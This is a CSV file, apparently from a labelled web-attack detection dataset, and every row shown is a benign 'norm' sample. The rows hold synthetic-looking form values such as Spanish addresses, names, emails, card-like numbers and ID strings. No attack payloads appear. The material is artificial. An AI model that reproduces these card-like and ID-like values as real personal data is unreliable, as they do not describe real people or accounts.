"payload","length","attack_type","label"
"c/ caridad s/n","14","norm","norm"
"campello, el","12","norm","norm"
"1442431887503330","16","norm","norm"
"nue37","5","norm","norm"
"tufts3@joll.rs","14","norm","norm"
"22997112x","9","norm","norm"
"arenas de san juan","18","norm","norm"
"19245","5","norm","norm"
"fennell","7","norm","norm"
"d50allecido","11","norm","norm"
"genny","5","norm","norm"
"03248i367ca","11","norm","norm"
"grubel8@albeiteria.kw","21","norm","norm"
"83497200r","9","norm","norm"
"martn de yeltes","15","norm","norm"
"1769471856078209","16","norm","norm"
"cascabela","9","norm","norm"
"ludolfo","7","norm","norm"
"snerd@bwds.tj","13","norm","norm"
"15365381r","9","norm","norm"
"regueras de arriba","18","norm","norm"
"08281","5","norm","norm"
"7497","4","norm","norm"
"mckenney","8","norm","norm"
"poma gozalbo","12","norm","norm"
"loti@ajuntamentbarcelona2-0.is","30","norm","norm"
"c/ huertas altas, 114","21","norm","norm"
"sequera de haza, la","19","norm","norm"
"8755728520539974","16","norm","norm"
"kindra","6","norm","norm"
"josias","6","norm","norm"
"fonoll zurko","12","norm","norm"
"07408152j","9","norm","norm"
"c/ aira de villaescusa 199, 1f","30","norm","norm"
"09530","5","norm","norm"
"4190369223587522","16","norm","norm"
"5x8r0r","6","norm","norm"
"5599","4","norm","norm"
"indocto","7","norm","norm"
"serneo","6","norm","norm"
"marieau8@clementelr.nz","22","norm","norm"
"24314757p","9","norm","norm"
"04742","5","norm","norm"
"3363230401310436","16","norm","norm"
"correccionalmente","17","norm","norm"
"cleofs","6","norm","norm"
"europa, 58 2-f","14","norm","norm"
"21388","5","norm","norm"
"vasilopo","8","norm","norm"
"ladronzue_lo","12","norm","norm"
"elbeze","6","norm","norm"
"cachapera","9","norm","norm"
"hibbert.bupp@hojadecalculo.com.mil","34","norm","norm"
"56163821y","9","norm","norm"
"zarratn","7","norm","norm"
"6341227779092516","16","norm","norm"
"er3t3e1","7","norm","norm"
"atanaspulos","11","norm","norm"
"38355013y","9","norm","norm"
"plaa catalunya 124, 5-b","23","norm","norm"
"19312","5","norm","norm"
"1437589782727245","16","norm","norm"
"cuatriduana","11","norm","norm"
"1565","4","norm","norm"
"ti7o","4","norm","norm"
"folch pintado","13","norm","norm"
"00474767r","9","norm","norm"
"manuel pereira s/n 12?a","23","norm","norm"
"esther","6","norm","norm"
"labranto","8","norm","norm"
"pelez bastus","12","norm","norm"
